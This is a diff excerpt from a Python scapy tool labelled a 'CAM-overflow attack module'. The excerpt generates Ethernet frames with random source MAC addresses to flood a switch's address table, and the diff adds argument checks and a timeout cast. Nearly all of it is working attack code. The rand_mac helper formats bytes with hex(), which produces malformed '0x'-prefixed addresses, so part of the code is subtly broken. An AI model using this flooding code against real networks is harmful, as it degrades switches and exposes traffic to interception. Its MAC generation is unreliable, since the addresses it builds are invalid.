@@ -10,13 +10,14 @@ def rand_mac()->str:
     return f"{hex(random.randint(0, 255))}:{hex(random.randint(0, 255))}:{hex(random.randint(0, 255))}:{hex(random.randint(0, 255))}:{hex(random.randint(0, 255))}:{hex(random.randint(0, 255))}"
 
 def cam_overflow(args: dict)->None:
-    print('CAM-overflow attack module, version 1.0')
+    if not validate_args(iface=args['iface']): return False
     iface = args['iface']
     input = args['input']
     mac_dst = args['mac_dst']
-    speed = args['timeout']
+    speed = int(args['timeout'])
     input = 'X'*64 if not input else input
     speed = 500 if not speed else speed
+    print('CAM-overflow attack module, version 1.0')
     try:
         print('*CAM-overflow attack started. Ctrl+C to stop')
         scapy.hexdump(Ether(src=rand_mac(), dst=mac_dst if mac_dst else rand_mac()) / (input))
